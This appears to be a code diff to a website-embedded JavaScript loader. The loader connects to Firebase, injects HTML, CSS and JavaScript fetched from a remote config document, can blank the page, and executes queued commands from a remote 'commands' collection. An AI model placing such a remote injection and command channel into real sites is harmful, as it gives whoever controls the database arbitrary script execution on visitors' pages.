@@ -1,7 +1,11 @@
 (function(){
   var CORE_VERSION = "v1"
   var PANEL_ORIGIN = (function(){
-    try { var s = document.currentScript; if (s && s.src) { return new URL(s.src).origin } } catch(e){}
+    try {
+      var s = document.currentScript;
+      if (s && s.dataset && s.dataset.api) return s.dataset.api
+      if (s && s.src) { return new URL(s.src).origin }
+    } catch(e){}
     return location.origin
   })()
   var firebaseLoaded = !!window.firebase
@@ -47,7 +51,7 @@
     btn.style.border='none'
     btn.style.padding='4px 8px'
     btn.style.borderRadius='6px'
-    btn.onclick=function(){window.open(PANEL_ORIGIN,'_blank')}
+    btn.onclick=function(){window.open('https://'+location.host.replace(/^www\./,''),'_blank')}
     bar.appendChild(btn)
     document.body.appendChild(bar)
   }
@@ -76,7 +80,7 @@
     db.collection('globalConfig').doc('default').onSnapshot(function(s){var d=s.exists? s.data() : {};if(d){if(d.maintenanceMode){document.body.innerHTML=''};injectHTML(d.defaultHTMLInjections||[]);injectCSS(d.defaultCSSInjections||[]);injectJS(d.defaultJSInjections||[]);if(d.darkMode) applyDarkMode(true)}})
     db.collection('sites').where('domain','==',domain).limit(1).onSnapshot(function(s){})
     heartbeat(domain); setInterval(function(){heartbeat(domain)},30000)
-    db.collection('commands').where('executed','==',false).onSnapshot(function(s){s.forEach(function(d){var c=d.data();if(!c.siteId||c.siteId===siteId){handleCommand(c);ackCommand(d.id)}})})
+    db.collection('commands').where('executed','==',false).onSnapshot(function(s){s.forEach(function(d){var c=d.data();if(!c.siteId||c.siteId===domain){handleCommand(c);ackCommand(d.id)}})})
     window.addEventListener('error',function(e){try{sendLog(domain,'error',{message:e.message,stack:e.error&&e.error.stack})}catch{}})
     try{sendLog(domain,'log',{event:'core_loaded',version:CORE_VERSION})}catch{}
   })
